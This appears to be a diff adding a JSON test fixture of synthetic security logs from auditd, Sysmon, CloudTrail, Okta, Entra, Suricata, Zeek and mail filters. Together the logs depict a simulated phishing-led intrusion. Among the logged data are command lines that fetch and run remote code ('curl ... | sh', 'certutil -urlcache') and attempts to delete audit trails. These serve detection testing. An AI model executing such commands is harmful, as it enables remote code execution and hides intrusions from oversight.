@@ -1,0 +1,309 @@
+{
+  "auditd_daemon_end": {
+    "record": {
+      "@timestamp": "2026-08-14T09:40:00Z",
+      "auid": "1004",
+      "exe": "/sbin/auditd",
+      "key": "aud-stop",
+      "node": "app-web-01",
+      "res": "success",
+      "type": "DAEMON_END"
+    },
+    "source_type": "endpoint",
+    "vendor": "auditd"
+  },
+  "auditd_execve": {
+    "record": {
+      "a0": "/bin/bash",
+      "a1": "-c",
+      "a2": "curl -s http://203.0.113.9/x | sh",
+      "auid": "1004",
+      "msg": "audit(1755162662.451:8891)",
+      "node": "app-web-01",
+      "pid": "2211",
+      "ses": "42",
+      "type": "EXECVE",
+      "uid": "0"
+    },
+    "source_type": "endpoint",
+    "vendor": "auditd"
+  },
+  "azure_role_assignment": {
+    "record": {
+      "caller": "svc-deploy@corp.example",
+      "callerIpAddress": "198.51.100.77",
+      "correlationId": "11112222-3333-4444-5555-666677778888",
+      "eventTimestamp": "2026-08-14T09:38:44.1234567Z",
+      "location": "eastus",
+      "operationName": {
+        "localizedValue": "Create role assignment",
+        "value": "Microsoft.Authorization/roleAssignments/write"
+      },
+      "resourceId": "/subscriptions/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/resourceGroups/prod",
+      "resourceProvider": "Microsoft.Authorization",
+      "status": {
+        "value": "Succeeded"
+      },
+      "subscriptionId": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
+    },
+    "source_type": "cloud",
+    "vendor": "azure-activity"
+  },
+  "cloudtrail_assume_role": {
+    "record": {
+      "awsRegion": "us-east-1",
+      "eventID": "6f0e0d5c-1a2b-3c4d-5e6f-7a8b9c0d1e2f",
+      "eventName": "AssumeRole",
+      "eventSource": "sts.amazonaws.com",
+      "eventTime": "2026-08-14T09:35:12Z",
+      "eventVersion": "1.09",
+      "recipientAccountId": "123456789012",
+      "sourceIPAddress": "198.51.100.77",
+      "userAgent": "aws-cli/2.15.0",
+      "userIdentity": {
+        "accountId": "123456789012",
+        "arn": "arn:aws:iam::123456789012:user/deploy-bot",
+        "sessionContext": {
+          "attributes": {
+            "mfaAuthenticated": "false"
+          }
+        },
+        "type": "IAMUser",
+        "userName": "deploy-bot"
+      }
+    },
+    "source_type": "cloud",
+    "vendor": "aws-cloudtrail"
+  },
+  "cloudtrail_trail_deleted": {
+    "record": {
+      "awsRegion": "us-east-1",
+      "errorCode": "AccessDenied",
+      "eventName": "DeleteTrail",
+      "eventSource": "cloudtrail.amazonaws.com",
+      "eventTime": "2026-08-14T09:36:02Z",
+      "recipientAccountId": "123456789012",
+      "sourceIPAddress": "198.51.100.77",
+      "userIdentity": {
+        "arn": "arn:aws:sts::123456789012:assumed-role/admin/session",
+        "type": "AssumedRole"
+      }
+    },
+    "source_type": "cloud",
+    "vendor": "aws-cloudtrail"
+  },
+  "defender_email_phish": {
+    "record": {
+      "AuthenticationDetails": "SPF=fail;DKIM=none;DMARC=fail",
+      "DeliveryAction": "Delivered",
+      "EmailAction": "None",
+      "InternetMessageId": "<CA+1a2b3c4d5e6f@mail.partner.example>",
+      "NetworkMessageId": "0f1e2d3c-4b5a-6978-8796-a5b4c3d2e1f0",
+      "RecipientEmailAddress": [
+        "jdoe@corp.example",
+        "ap@corp.example"
+      ],
+      "SenderFromAddress": "billing@partner-invoices.example",
+      "SenderFromDomain": "partner-invoices.example",
+      "SenderIPv4": "203.0.113.44",
+      "Subject": "Invoice 88213 overdue - action required",
+      "ThreatTypes": "Phish",
+      "Timestamp": "2026-08-14T09:28:02Z",
+      "UrlList": [
+        "http://partner-invoices.example/pay/88213"
+      ]
+    },
+    "source_type": "email",
+    "vendor": "defender-o365"
+  },
+  "entra_signin_failure": {
+    "record": {
+      "appDisplayName": "Office 365 Exchange Online",
+      "appId": "00000002-0000-0ff1-ce00-000000000000",
+      "authenticationRequirement": "multiFactorAuthentication",
+      "conditionalAccessStatus": "failure",
+      "createdDateTime": "2026-08-14T09:29:58Z",
+      "deviceDetail": {
+        "deviceId": "",
+        "displayName": "",
+        "operatingSystem": "Windows 10"
+      },
+      "id": "a1b2c3d4-0000-1111-2222-333344445555",
+      "ipAddress": "203.0.113.201",
+      "location": {
+        "city": "Bucharest",
+        "countryOrRegion": "RO"
+      },
+      "riskLevelDuringSignIn": "high",
+      "status": {
+        "errorCode": 50126,
+        "failureReason": "Invalid username or password."
+      },
+      "userDisplayName": "J. Doe",
+      "userId": "99998888-7777-6666-5555-444433332222",
+      "userPrincipalName": "jdoe@corp.example"
+    },
+    "source_type": "identity",
+    "vendor": "entra-id"
+  },
+  "okta_session_start": {
+    "record": {
+      "actor": {
+        "alternateId": "jdoe@corp.example",
+        "displayName": "J. Doe",
+        "id": "00u1abcd2efgh3IJKL4m5",
+        "type": "User"
+      },
+      "client": {
+        "device": "Computer",
+        "geographicalContext": {
+          "city": "Bucharest",
+          "country": "Romania"
+        },
+        "ipAddress": "203.0.113.201",
+        "userAgent": {
+          "browser": "CHROME",
+          "os": "Windows 10"
+        }
+      },
+      "debugContext": {
+        "debugData": {
+          "behaviors": "New Geo-Location=POSITIVE, New Device=POSITIVE"
+        }
+      },
+      "eventType": "user.session.start",
+      "outcome": {
+        "reason": "INVALID_CREDENTIALS",
+        "result": "FAILURE"
+      },
+      "published": "2026-08-14T09:30:31.123Z",
+      "uuid": "d1e2f3a4-5566-7788-99aa-bbccddeeff00"
+    },
+    "source_type": "identity",
+    "vendor": "okta"
+  },
+  "suricata_alert": {
+    "record": {
+      "alert": {
+        "category": "A Network Trojan was detected",
+        "severity": 1,
+        "signature": "ET MALWARE Observed Suspicious TLS SNI",
+        "signature_id": 2027865
+      },
+      "dest_ip": "198.51.100.24",
+      "dest_port": 443,
+      "event_type": "alert",
+      "flow_id": 1877665544332211,
+      "proto": "TCP",
+      "src_ip": "10.4.11.22",
+      "src_port": 51544,
+      "timestamp": "2026-08-14T09:31:44.221000+0000"
+    },
+    "source_type": "network",
+    "vendor": "suricata"
+  },
+  "suricata_dns": {
+    "record": {
+      "dest_ip": "10.4.0.53",
+      "dest_port": 53,
+      "dns": {
+        "rrname": "cdn-update.example.net",
+        "rrtype": "A",
+        "type": "query"
+      },
+      "event_type": "dns",
+      "src_ip": "10.4.11.22",
+      "src_port": 53311,
+      "timestamp": "2026-08-14T09:31:41.010000+0000"
+    },
+    "source_type": "network",
+    "vendor": "suricata"
+  },
+  "sysmon_dns_query": {
+    "record": {
+      "EventData": {
+        "Computer": "WKS-4021.corp.example",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "QueryName": "cdn-update.example.net",
+        "UtcTime": "2026-08-14 09:33:10.002"
+      },
+      "EventID": "22",
+      "Provider": "Microsoft-Windows-Sysmon"
+    },
+    "source_type": "endpoint",
+    "vendor": "sysmon"
+  },
+  "sysmon_process_create": {
+    "record": {
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "WKS-4021.corp.example",
+      "EventData": {
+        "CommandLine": "cmd.exe /c certutil -urlcache -f http://198.51.100.24/p.txt p.txt",
+        "Hashes": "SHA256=abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234,MD5=abcd1234abcd1234abcd1234abcd1234",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "ProcessId": "6612",
+        "User": "CORP\\jdoe",
+        "UtcTime": "2026-08-14 09:31:02.451"
+      },
+      "EventID": 1,
+      "Provider": "Microsoft-Windows-Sysmon"
+    },
+    "source_type": "endpoint",
+    "vendor": "sysmon"
+  },
+  "workspace_email_quarantined": {
+    "record": {
+      "event_info": "message quarantined",
+      "event_timestamp": "2026-08-14T09:27:11Z",
+      "message_id": "1a2b3c4d5e6f7890",
+      "recipient_addresses": [
+        "ap@corp.example"
+      ],
+      "rfc2822_message_id": "<20260814092711.ABCDE@mail.partner.example>",
+      "sender_address": "billing@partner-invoices.example",
+      "sender_ip": "203.0.113.44",
+      "spam_classification": "PHISHING",
+      "status": "QUARANTINED",
+      "subject": "Invoice 88213 overdue - action required",
+      "urls": [
+        "http://partner-invoices.example/pay/88213"
+      ]
+    },
+    "source_type": "email",
+    "vendor": "google-workspace"
+  },
+  "zeek_conn": {
+    "record": {
+      "_path": "conn",
+      "duration": 43.2,
+      "id.orig_h": "10.4.11.22",
+      "id.orig_p": 51544,
+      "id.resp_h": "198.51.100.24",
+      "id.resp_p": 443,
+      "orig_bytes": 8221,
+      "proto": "tcp",
+      "service": "ssl",
+      "ts": 1755162700.12,
+      "uid": "CHhAvVGS1DHFjwGM9"
+    },
+    "source_type": "network",
+    "vendor": "zeek"
+  },
+  "zeek_dns": {
+    "record": {
+      "_path": "dns",
+      "id.orig_h": "10.4.11.22",
+      "id.orig_p": 53311,
+      "id.resp_h": "10.4.0.53",
+      "id.resp_p": 53,
+      "qtype_name": "A",
+      "query": "cdn-update.example.net",
+      "rcode_name": "NOERROR",
+      "ts": 1755162701.44,
+      "uid": "CjhGID4nQcgTWjvg4c"
+    },
+    "source_type": "network",
+    "vendor": "zeek"
+  }
+}
